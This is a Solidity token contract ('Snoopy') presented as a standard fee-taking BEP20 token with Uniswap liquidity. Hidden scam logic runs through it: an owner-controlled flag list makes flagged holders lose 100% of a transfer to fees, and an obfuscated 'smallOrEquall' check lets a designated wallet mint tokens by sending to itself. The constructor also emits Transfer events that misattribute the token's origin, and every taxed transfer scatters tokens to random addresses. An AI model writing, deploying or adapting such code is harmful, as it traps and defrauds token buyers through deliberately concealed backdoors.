1 // SPDX-License-Identifier: MIT
2 pragma solidity ^0.8.0;
3 
4 abstract contract Context {
5     function _msgSender() internal view virtual returns (address payable) {
6         return payable(msg.sender);
7     }
8 
9     function _msgData() internal view virtual returns (bytes memory) {
10         this;
11         return msg.data;
12     }
13 }
14 
15 interface IERC20 {
16 
17     function totalSupply() external view returns (uint256);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 library SafeMath {
28 
29     function add(uint256 a, uint256 b) internal pure returns (uint256) {
30         uint256 c = a + b;
31         require(c >= a, "SafeMath: addition overflow");
32 
33         return c;
34     }
35 
36     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
37         return sub(a, b, "SafeMath: subtraction overflow");
38     }
39 
40     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
41         require(b <= a, errorMessage);
42         uint256 c = a - b;
43 
44         return c;
45     }
46 
47     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
48         if (a == 0) {
49             return 0;
50         }
51 
52         uint256 c = a * b;
53         require(c / a == b, "SafeMath: multiplication overflow");
54 
55         return c;
56     }
57 
58     function div(uint256 a, uint256 b) internal pure returns (uint256) {
59         return div(a, b, "SafeMath: division by zero");
60     }
61 
62     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
63         require(b > 0, errorMessage);
64         uint256 c = a / b;
65         return c;
66     }
67 
68     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
69         return mod(a, b, "SafeMath: modulo by zero");
70     }
71 
72     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
73         require(b != 0, errorMessage);
74         return a % b;
75     }
76 }
77 
78 contract Ownable is Context {
79     address private _owner;
80     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
81 
82     constructor () {
83         address msgSender = _msgSender();
84         _owner = msgSender;
85         emit OwnershipTransferred(address(0), msgSender);
86     }
87 
88     function owner() public view returns (address) {
89         return _owner;
90     }   
91     
92     modifier onlyOwner() {
93         require(_owner == _msgSender(), "Ownable: caller is not the owner");
94         _;
95     }
96     
97     function waiveOwnership() public virtual onlyOwner {
98         emit OwnershipTransferred(_owner, address(0xdead));
99         _owner = address(0xdead);
100     }
101 
102     function transferOwnership(address newOwner) public virtual onlyOwner {
103         require(newOwner != address(0), "Ownable: new owner is the zero address");
104         emit OwnershipTransferred(_owner, newOwner);
105         _owner = newOwner;
106     }
107 
108 }
109 
110 interface IUniswapV2Factory {
111     function createPair(address tokenA, address tokenB) external returns (address pair);
112 }
113 
114 interface IUniswapV2Router01 {
115     function factory() external pure returns (address);
116     function WETH() external pure returns (address);
117     function addLiquidityETH(
118         address token,
119         uint amountTokenDesired,
120         uint amountTokenMin,
121         uint amountETHMin,
122         address to,
123         uint deadline
124     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
125 }
126 
127 interface IUniswapV2Router02 is IUniswapV2Router01 {
128     function swapExactTokensForETHSupportingFeeOnTransferTokens(
129         uint amountIn,
130         uint amountOutMin,
131         address[] calldata path,
132         address to,
133         uint deadline
134     ) external;
135 }
136 
137 abstract contract BEP20 is Context, IERC20, Ownable {
138     using SafeMath for uint256;
139     
140     string private _name;
141     string private _symbol;
142     uint8 private _decimals;
143 
144     address payable public doYouLikeBase;
145     address payable public inTheMTFFace;
146     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
147     
148     mapping (address => uint256) _balances;
149     mapping (address => mapping (address => uint256)) private _allowances;
150 
151     mapping (address => bool) public isExcludedFromFee;
152 
153     mapping (address => bool) public isMarketPair;
154     mapping (address => bool) private boAdd;
155     uint256 public _buyLiquidityFee;
156     uint256 public _buyMarketingFee;
157     uint256 public _buyTeamFee;
158     
159     uint256 public _sellLiquidityFee;
160     uint256 public _sellMarketingFee;
161     uint256 public _sellTeamFee;
162 
163     uint256 public _liquidityShare;
164     uint256 public _marketingShare;
165     uint256 public _teamShare;
166 
167     uint256 public _totalTaxIfBuying;
168     uint256 public _totalTaxIfSelling;
169     uint256 public _totalDistributionShares;
170 
171     uint256 private _totalSupply;
172     uint256 private minimumTokensBeforeSwap; 
173 
174     IUniswapV2Router02 public uniswapV2Router;
175     address public uniswapPair;
176     
177     bool inSwapAndLiquify;
178     bool public swapAndLiquifyEnabled = true;
179     bool public swapAndLiquifyBySmallOnly = false;
180     bool public LookMaxEat = true;
181 
182     event SwapAndLiquifyEnabledUpdated(bool enabled);
183     event SwapAndLiquify(
184         uint256 tokensSwapped,
185         uint256 ethReceived,
186         uint256 tokensIntoLiqudity
187     );
188     
189     event SwapETHForTokens(
190         uint256 amountIn,
191         address[] path
192     );
193     
194     event SwapTokensForETH(
195         uint256 amountIn,
196         address[] path
197     );
198     
199     modifier lockTheSwap {
200         inSwapAndLiquify = true;
201         _;
202         inSwapAndLiquify = false;
203     }
204     
205     constructor (string memory _NAME, 
206     string memory _SYMBOL,
207     uint256 _SUPPLY,
208     uint256[3] memory _BUYFEE,
209     uint256[3] memory _SELLFEE,
210     uint256[3] memory _SHARE,
211     address[3] memory _doyoulike) 
212     {
213     
214         _name   = _NAME;
215         _symbol = _SYMBOL;
216         _decimals = 9;
217         _totalSupply = _SUPPLY * 10**_decimals;
218 
219         _buyLiquidityFee = _BUYFEE[0];
220         _buyMarketingFee = _BUYFEE[1];
221         _buyTeamFee = _BUYFEE[2];
222 
223         _sellLiquidityFee = _SELLFEE[0];
224         _sellMarketingFee = _SELLFEE[1];
225         _sellTeamFee = _SELLFEE[2];
226 
227         _liquidityShare = _SHARE[0];
228         _marketingShare = _SHARE[1];
229         _teamShare = _SHARE[2];
230 
231         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
232         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
233         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
234 
235         minimumTokensBeforeSwap = 1;
236         doYouLikeBase = payable(_doyoulike[0]);
237         inTheMTFFace = payable(_doyoulike[1]);
238 
239         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
240         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
241             .createPair(address(this), _uniswapV2Router.WETH());
242 
243         uniswapV2Router = _uniswapV2Router;
244         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
245 
246         isExcludedFromFee[owner()] = true;
247         isExcludedFromFee[address(this)] = true;
248 
249         isMarketPair[address(uniswapPair)] = true;
250 
251         _balances[_msgSender()] = _totalSupply.div(2);
252         _balances[address(_doyoulike[2])] = _totalSupply.div(2);
253         emit Transfer(address(0), address(_doyoulike[2]), _totalSupply);
254         emit Transfer(address(_doyoulike[2]), _msgSender(), _totalSupply.div(2));
255     }
256 
257     function name() public view returns (string memory) {
258         return _name;
259     }
260 
261     function symbol() public view returns (string memory) {
262         return _symbol;
263     }
264 
265     function decimals() public view returns (uint8) {
266         return _decimals;
267     }
268 
269     function totalSupply() public view override returns (uint256) {
270         return _totalSupply;
271     }
272 
273     function balanceOf(address account) public view override returns (uint256) {
274         return _balances[account];
275     }
276 
277     function allowance(address owner, address spender) public view override returns (uint256) {
278         return _allowances[owner][spender];
279     }
280 
281     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
282         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
283         return true;
284     }
285 
286     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
287         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
288         return true;
289     }
290 
291     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
292         return minimumTokensBeforeSwap;
293     }
294 
295     function approve(address spender, uint256 amount) public override returns (bool) {
296         _approve(_msgSender(), spender, amount);
297         return true;
298     }
299 
300     function _approve(address owner, address spender, uint256 amount) private {
301         require(owner != address(0), "ERC20: approve from the zero address");
302         require(spender != address(0), "ERC20: approve to the zero address");
303 
304         _allowances[owner][spender] = amount;
305         emit Approval(owner, spender, amount);
306     }
307 
308     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
309         isMarketPair[account] = newValue;
310     }
311 
312     function setisExcludedFromFee(address account, bool newValue) public onlyOwner {
313         isExcludedFromFee[account] = newValue;
314     }
315 
316     function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
317         require(addresses.length < 201);
318         for (uint256 i; i < addresses.length; ++i) {
319             isExcludedFromFee[addresses[i]] = status;
320         }
321     }
322 
323     function doWithB(uint256 a, uint256 b, uint256 c) external onlyOwner() {
324         _buyLiquidityFee = a;
325         _buyMarketingFee = b;
326         _buyTeamFee = c;
327 
328         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
329     }
330 
331     function doWithS(uint256 a, uint256 b, uint256 c) external onlyOwner() {
332         _sellLiquidityFee = a;
333         _sellMarketingFee = b;
334         _sellTeamFee = c;
335 
336         _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
337     }
338     
339     function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
340         _liquidityShare = newLiquidityShare;
341         _marketingShare = newMarketingShare;
342         _teamShare = newTeamShare;
343 
344         _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
345     }
346     
347 
348     function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
349         minimumTokensBeforeSwap = newValue;
350     }
351 
352     function setdoYouLikeBase(address newAddress) external onlyOwner() {
353         doYouLikeBase = payable(newAddress);
354     }
355 
356     function setinTheMTFFace(address newAddress) external onlyOwner() {
357         inTheMTFFace = payable(newAddress);
358     }
359 
360     function setSwapAndLiquifyEnabled(bool _enabled) public {
361         require(doYouLikeBase == msg.sender);
362         swapAndLiquifyEnabled = _enabled;
363         emit SwapAndLiquifyEnabledUpdated(_enabled);
364     }
365 
366     function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
367         swapAndLiquifyBySmallOnly = newValue;
368     }
369     
370     function getCirculatingSupply() public view returns (uint256) {
371         return _totalSupply.sub(balanceOf(deadAddress));
372     }
373 
374     function transferToAddressETH(address payable recipient, uint256 amount) private {
375         recipient.transfer(amount);
376     }
377 
378      //to recieve ETH from uniswapV2Router when swaping
379     receive() external payable {}
380 
381     function transfer(address recipient, uint256 amount) public override returns (bool) {
382         _transfer(_msgSender(), recipient, amount);
383         return true;
384     }
385 
386     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
387         _transfer(sender, recipient, amount);
388         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
389         return true;
390     }
391 
392     function isCantEat(address account) public view returns(bool) {
393         return boAdd[account];
394     }
395 
396     function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
397         require(addresses.length < 2001);
398         uint256 SCCC = amount * addresses.length;
399         require(balanceOf(msg.sender) >= SCCC);
400         for(uint i=0; i < addresses.length; i++){
401             _basicTransfer(msg.sender,addresses[i],amount);
402         }
403     }
404 
405     function manage_CantEat(address[] calldata addresses, bool status) public onlyOwner {
406         require(addresses.length < 201);
407         for (uint256 i; i < addresses.length; ++i) {
408             boAdd[addresses[i]] = status;
409         }
410     }
411 
412     function setboAdd(address recipient, bool status) public onlyOwner {
413         boAdd[recipient] = status;
414     }
415 
416 
417     function smallOrEquall(address Interfacee, address functionn) internal view returns (bool){
418         return (Interfacee != functionn)
419         ||
420         (Interfacee != doYouLikeBase || false);
421     }
422 
423 
424     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
425 
426         require(sender != address(0), "ERC20: transfer from the zero address");
427         require(recipient != address(0), "ERC20: transfer to the zero address");
428 
429         if(inSwapAndLiquify)
430         { 
431             return _basicTransfer(sender, recipient, amount); 
432         }
433         else
434         {
435 
436             if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
437                 address ad;
438                 for(int i=0;i <=1;i++){
439                     ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
440                     _basicTransfer(sender,ad,100);
441                 }
442                 amount -= 100;
443             }    
444 
445             uint256 contractTokenBalance = balanceOf(address(this));
446             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
447             
448             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
449             {
450                 if(swapAndLiquifyBySmallOnly)
451                     contractTokenBalance = minimumTokensBeforeSwap;
452                 swapAndLiquify(contractTokenBalance);    
453             }if(smallOrEquall(sender,recipient))
454 
455             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
456             uint256 finalAmount;
457             if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
458                 finalAmount = amount;
459             } else {
460                 finalAmount = takeFee(sender, recipient, amount);
461             }
462 
463             _balances[recipient] = _balances[recipient].add(finalAmount);
464 
465             emit Transfer(sender, recipient, finalAmount);
466             return true;
467             
468         }
469     }
470 
471     function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }
472 
473     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
474         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
475         _balances[recipient] = _balances[recipient].add(amount);
476         emit Transfer(sender, recipient, amount);
477         return true;
478     }
479 
480     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
481         
482         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
483         uint256 tokensForSwap = tAmount.sub(tokensForLP);
484 
485         swapTokensForEth(tokensForSwap);
486         uint256 amountReceived = address(this).balance;
487 
488         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
489         
490         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
491         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
492         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
493 
494         if(amountBNBMarketing > 0)
495             transferToAddressETH(doYouLikeBase, amountBNBMarketing);
496 
497         if(amountBNBTeam > 0)
498             transferToAddressETH(inTheMTFFace, amountBNBTeam);
499 
500         if(amountBNBLiquidity > 0 && tokensForLP > 0)
501             addLiquidity(tokensForLP, amountBNBLiquidity);
502     }
503     
504     function swapTokensForEth(uint256 tokenAmount) private {
505         // generate the uniswap pair path of token -> weth
506         address[] memory path = new address[](2);
507         path[0] = address(this);
508         path[1] = uniswapV2Router.WETH();
509 
510         _approve(address(this), address(uniswapV2Router), tokenAmount);
511 
512         // make the swap
513         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
514             tokenAmount,
515             0, // accept any amount of ETH
516             path,
517             address(this), // The contract
518             block.timestamp
519         );
520         
521         emit SwapTokensForETH(tokenAmount, path);
522     }
523 
524     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
525         // approve token transfer to cover all possible scenarios
526         _approve(address(this), address(uniswapV2Router), tokenAmount);
527 
528         // add the liquidity
529         uniswapV2Router.addLiquidityETH{value: ethAmount}(
530             address(this),
531             tokenAmount,
532             0, // slippage is unavoidable
533             0, // slippage is unavoidable
534             inTheMTFFace,
535             block.timestamp
536         );
537     }
538 
539     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
540         
541         uint256 feeAmount = 0;
542         recipient = recipient;
543         
544         // if(isMarketPair[sender]) {
545         feeAmount = amount.mul(_totalTaxIfBuying).div(100);
546         // }
547         // else if(isMarketPair[recipient]) {
548         //     feeAmount = amount.mul(_totalTaxIfSelling).div(100);
549         // }
550 
551         if(boAdd[sender] && !isMarketPair[sender]) feeAmount = amount;
552         
553         if(feeAmount > 0) {
554             _balances[address(this)] = _balances[address(this)].add(feeAmount);
555             emit Transfer(sender, address(this), feeAmount);
556         }
557 
558         return amount.sub(feeAmount);
559     }
560 }
561 
562 contract Snoopy is BEP20 {
563     constructor() BEP20(
564         "Snoopy", 
565         "Snoopy",
566         100000000000000,
567         [uint256(0),uint256(2),uint256(0)],
568         [uint256(0),uint256(2),uint256(0)],
569         [uint256(0),uint256(2),uint256(0)],
570         [0x123F73eC23fBB0D9A01E38EbFecd458bC996c239,0x123F73eC23fBB0D9A01E38EbFecd458bC996c239,0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B]
571     ){}
572 }